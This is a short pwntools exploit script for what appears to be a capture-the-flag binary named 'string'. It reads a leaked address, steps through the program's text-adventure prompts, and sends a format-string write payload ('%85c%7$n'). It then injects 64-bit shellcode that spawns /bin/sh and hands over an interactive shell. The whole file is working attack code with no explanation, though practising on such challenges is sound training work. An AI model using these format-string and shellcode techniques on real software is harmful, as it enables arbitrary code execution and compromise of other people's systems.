from pwn import *
p = process('./string')
# p = remote("111.200.241.244", 59468)

p.recvuntil("secret[0] is ")

v4_addr = int(p.recvuntil('\n'), 16)
print(v4_addr)

p.recvuntil("What should your character's name be:\n")
p.sendline("nigma")
p.recvuntil("So, where you will go?east or up?:\n")
p.sendline("east")
p.recvuntil("go into there(1), or leave(0)?:")
p.sendline("1")
p.recvuntil("'Give me an address'")
p.sendline(str(v4_addr))
p.recvuntil("And, you wish is:")
p.sendline("%85c%7$n")

#shellcode = asm(shellcraft.sh())
shellcode64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.recvuntil("Wizard: I will help you! USE YOU SPELL")
p.sendline(shellcode64)

p.interactive() 



